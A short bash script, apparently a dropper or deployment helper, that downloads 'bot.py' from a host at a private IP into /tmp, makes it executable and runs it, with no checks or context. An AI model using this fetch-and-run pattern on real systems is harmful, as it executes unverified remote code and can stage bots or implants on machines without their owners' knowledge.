#!/bin/bash

wget http://10.1.4.112/bot.py --output-document /tmp/bot.py
chmod 755 /tmp/bot.py
python3 /tmp/bot.py
